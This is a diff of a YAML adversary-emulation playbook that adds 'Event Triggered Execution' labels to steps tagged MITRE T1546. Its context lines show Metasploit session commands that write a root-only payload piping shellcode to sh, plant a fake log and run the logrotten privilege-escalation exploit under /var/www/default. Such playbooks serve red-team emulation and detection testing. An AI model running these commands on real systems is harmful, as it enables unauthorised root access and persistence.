@@ -158,6 +158,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
@@ -165,6 +166,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "rm -rf log"
@@ -172,6 +174,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "mkdir log"
@@ -179,6 +182,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "echo empty > log/accesss.log"
@@ -186,6 +190,7 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
@@ -193,12 +198,14 @@ commands:
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: sleep
     seconds: 960
     metadata:
       techniques: "T1546"
       tactics: " Privilege Escalation,Persistence"
+      technique_name: "Event Triggered Execution"
 
   - type: msf-session
     cmd: "id"
